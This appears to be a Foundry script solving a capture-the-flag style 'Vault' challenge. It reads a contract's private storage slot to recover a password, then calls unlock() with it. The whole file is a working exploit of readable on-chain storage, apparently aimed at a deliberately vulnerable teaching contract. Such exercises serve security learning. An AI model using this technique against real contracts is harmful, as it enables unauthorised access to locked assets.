// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "../src/Vault.sol";
import {Script, console, console2} from "forge-std/Script.sol";


contract VaultScript is Script {
    Vault v ;
    // function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {
    //     uint8 i = 0;
    //     while(i < 32 && _bytes32[i] != 0) {
    //         i++;
    //     }
    //     bytes memory bytesArray = new bytes(i);
    //     for (i = 0; i < 32 && _bytes32[i] != 0; i++) {
    //         bytesArray[i] = _bytes32[i];
    //     }
    //     return string(bytesArray);
    // }

    function setUp() public {
        // uint256 deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        // v  = new Vault(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        v = Vault(0xfF71ABA73540536826EDe2B6E8f71ddF678dB2e5);
        vm.stopBroadcast();
    }
    function run() public{
        // bytes32 password = vm.load(address(v), bytes32(uint256(1)));

        // console.log(Strings.toString());
        
        bytes32 password = vm.load(address(v), bytes32(uint256(1)));
        // address(v).call(abi.encodeWithSignature("unlock(bytes32)", password));
        // bool res = v.locked();
        // console.log("res: %s", bytes32ToString(password));
        console2.logBytes32(password);
        console2.logBool(v.locked());
        address(v).call(abi.encodeWithSignature("unlock(bytes32)", password));
        console2.logBool(v.locked());
    }
}